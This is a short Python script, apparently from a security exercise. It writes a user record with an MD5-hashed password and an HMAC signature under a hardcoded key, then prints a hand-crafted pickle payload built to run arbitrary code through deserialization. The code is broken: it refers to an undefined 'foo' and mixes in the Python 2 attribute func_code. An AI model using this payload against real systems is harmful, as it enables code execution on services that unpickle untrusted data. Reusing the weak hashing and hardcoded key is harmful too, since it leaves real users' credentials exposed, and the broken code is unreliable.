import json, pickle, hashlib, hmac, getpass
import base64

def fun(name: str,password: str):
    s = {"username":name,"password":hashlib.md5(password.encode()).hexdigest()}
    with open("users.json","w") as f:
        signature = hmac.new(b'shared-public-key', pickle.dumps(s), hashlib.sha1).hexdigest()
        s.update({'signature': signature})
        f.write(json.dumps(s))
    print('Added!')

if __name__ == '__main__':
    u = input("Username : ")
    p = getpass.getpass()
    fun(u,p)
    print ("""ctypes
    FunctionType
    (cpickle
    loads
    (cbase64
    b64decode
    (S'%s'
    tRtRc__builtin__
    globals
    (tRS''
    tR(tR.""" % base64.b64encode(pickle.dumps(foo.func_code)))